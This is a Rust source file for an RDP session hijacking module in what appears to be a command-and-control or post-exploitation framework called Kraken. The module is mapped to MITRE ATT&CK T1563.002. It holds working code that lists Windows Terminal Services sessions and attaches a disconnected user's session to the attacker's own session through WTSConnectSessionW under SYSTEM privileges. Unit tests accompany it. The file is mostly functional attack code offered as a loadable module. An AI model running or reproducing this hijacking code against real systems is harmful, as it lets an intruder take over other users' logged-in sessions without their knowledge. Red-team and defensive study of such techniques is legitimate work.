//! mod-rdp: RDP Session Hijacking
//!
//! Takes over disconnected RDP sessions using WTSConnectSession.
//! Requires SYSTEM privileges.
//!
//! ## MITRE ATT&CK
//! - T1563.002: Remote Service Session Hijacking: RDP Hijacking

use common::{KrakenError, Module, ModuleId, ShellOutput, TaskId, TaskResult};

pub struct RdpModule {
    id: ModuleId,
}

impl RdpModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("rdp"),
        }
    }
}

impl Default for RdpModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for RdpModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "RDP Session Hijacking"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        // Parse session_id from task_data (simple u32 LE)
        if task_data.len() < 4 {
            return Err(KrakenError::Protocol("invalid rdp task data: need 4 bytes for session_id".into()));
        }
        let session_id = u32::from_le_bytes([task_data[0], task_data[1], task_data[2], task_data[3]]);
        let msg = hijack_session(session_id)?;
        Ok(TaskResult::Shell(ShellOutput {
            stdout: msg,
            stderr: String::new(),
            exit_code: 0,
            duration_ms: 0,
        }))
    }
}

#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(RdpModule);

/// Information about an RDP session
#[derive(Debug)]
pub struct RdpSessionInfo {
    pub session_id: u32,
    pub username: String,
    pub state: String,
}

/// List active and disconnected RDP sessions
#[cfg(windows)]
pub fn list_sessions() -> Result<Vec<RdpSessionInfo>, KrakenError> {
    use windows_sys::Win32::System::RemoteDesktop::{
        WTSEnumerateSessionsW, WTSFreeMemory, WTS_SESSION_INFOW,
    };

    unsafe {
        let mut session_info: *mut WTS_SESSION_INFOW = std::ptr::null_mut();
        let mut count: u32 = 0;

        let result = WTSEnumerateSessionsW(
            0isize, // WTS_CURRENT_SERVER_HANDLE
            0,
            1,
            &mut session_info,
            &mut count,
        );

        if result == 0 {
            return Err(KrakenError::Module("WTSEnumerateSessionsW failed".into()));
        }

        let mut sessions = Vec::new();
        for i in 0..count as usize {
            let info = &*session_info.add(i);
            let name = wstr_to_string(info.pWinStationName);
            let state = match info.State {
                0 => "Active",
                1 => "Connected",
                2 => "ConnectQuery",
                3 => "Shadow",
                4 => "Disconnected",
                5 => "Idle",
                6 => "Listen",
                7 => "Reset",
                8 => "Down",
                9 => "Init",
                _ => "Unknown",
            };
            sessions.push(RdpSessionInfo {
                session_id: info.SessionId,
                username: name,
                state: state.to_string(),
            });
        }

        WTSFreeMemory(session_info as *mut _);
        Ok(sessions)
    }
}

/// Hijack a disconnected RDP session by connecting it to the current session
#[cfg(windows)]
pub fn hijack_session(target_session_id: u32) -> Result<String, KrakenError> {
    use windows_sys::Win32::System::RemoteDesktop::WTSConnectSessionW;

    unsafe {
        let mut current_session: u32 = 0;
        let current_pid = std::process::id();
        if ProcessIdToSessionId(current_pid, &mut current_session) == 0 {
            return Err(KrakenError::Module("ProcessIdToSessionId failed".into()));
        }

        // Connect target session to current session; empty password for SYSTEM context
        let result = WTSConnectSessionW(
            target_session_id,
            current_session,
            std::ptr::null(), // password (empty — requires SYSTEM)
            0,                // bWait = FALSE
        );

        if result == 0 {
            return Err(KrakenError::Module(format!(
                "WTSConnectSessionW failed for session {}",
                target_session_id
            )));
        }

        Ok(format!(
            "Successfully hijacked RDP session {} -> session {}",
            target_session_id, current_session
        ))
    }
}

#[cfg(not(windows))]
pub fn list_sessions() -> Result<Vec<RdpSessionInfo>, KrakenError> {
    Err(KrakenError::Module("RDP hijacking is only supported on Windows".into()))
}

#[cfg(not(windows))]
pub fn hijack_session(_session_id: u32) -> Result<String, KrakenError> {
    Err(KrakenError::Module("RDP hijacking is only supported on Windows".into()))
}

#[cfg(windows)]
#[link(name = "kernel32")]
extern "system" {
    fn ProcessIdToSessionId(dwProcessId: u32, pSessionId: *mut u32) -> i32;
}

#[cfg(windows)]
unsafe fn wstr_to_string(ptr: *const u16) -> String {
    if ptr.is_null() {
        return String::new();
    }
    let mut len = 0usize;
    while *ptr.add(len) != 0 {
        len += 1;
    }
    let slice = std::slice::from_raw_parts(ptr, len);
    String::from_utf16_lossy(slice)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_id() {
        let module = RdpModule::new();
        assert_eq!(module.id().as_str(), "rdp");
        assert_eq!(module.name(), "RDP Session Hijacking");
        assert!(!module.version().is_empty());
    }

    #[test]
    fn test_invalid_task_data_too_short() {
        let module = RdpModule::new();
        let result = module.handle(TaskId::new(), &[0xFF]);
        assert!(result.is_err());
        match result {
            Err(KrakenError::Protocol(_)) => {}
            other => panic!("expected Protocol error, got {:?}", other),
        }
    }

    #[test]
    #[cfg(not(windows))]
    fn test_platform_guard_hijack() {
        let err = hijack_session(1);
        assert!(err.is_err());
    }

    #[test]
    #[cfg(not(windows))]
    fn test_platform_guard_list() {
        let err = list_sessions();
        assert!(err.is_err());
    }
}
